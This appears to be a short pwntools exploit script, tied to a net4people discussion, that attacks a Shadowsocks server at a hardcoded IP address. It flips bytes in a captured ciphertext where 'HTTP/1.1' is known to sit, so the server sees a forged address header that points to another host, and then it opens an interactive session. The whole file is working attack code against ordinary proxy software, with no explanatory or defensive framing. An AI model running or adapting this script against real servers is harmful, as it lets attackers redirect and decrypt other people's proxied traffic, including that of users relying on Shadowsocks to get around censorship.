from pwn import *
# https://github.com/net4people/bbs/issues/24

r = remote('15.165.73.176', 8388)

import binascii
c = bytearray(binascii.unhexlify('50364333db1594e55bbb0d0e6cfe1d69cc61f49827ef6a1c57b0ecddb79cf3bf79a8a28cf9ccfd08a17449e14c4438f2e94fe961154b4f8f1a1288be6eb79880bc0cef627f75eeb7daf9ae1a21845c93f598b063177e2705b2a63c52fa2a263d633c8b79ff563312af2bd16de621e138a82deeb8e83bed41e0b65a2853c89fbbd84cb9c7dfa414eb9f052a11b61cf76eadb0543d822fba1614ebe905f77f849d07746e1fd39709414299bc5d4232811ef260a09fc97739f083239ac84254e02163e118f47a770c341879d1b163c1eee9eef38d552471c293addac80ed12fa82c90e43982ca1c3b8f94026d95fc9b2084a500bbc6dd1ee885408a1804eab771ef084a3deac7e4e1364c3d68da9f0e13fd92b1d5d00be1ea95afbd02c7b149d61f5ad5e8aeb53598719731'))

# 128, 61, 740, 70
# HTTP/1.1 200 OK
c[16] ^= ord('H') ^ 1 # Now the server gets an addrtype 1,

# 13.209.57.159

c[17] ^= ord('T') ^ 128
c[18] ^= ord('T') ^ 61
c[19] ^= ord('P') ^ 240
c[20] ^= ord('/') ^ 70

c[21] ^= ord('1') ^ 0x04 # 12
c[22] ^= ord('.') ^ 0xd2 # 34

# context.log_level = b'debug'

r.send(c)

# HTTP/1.1 200 OK

r.interactive()
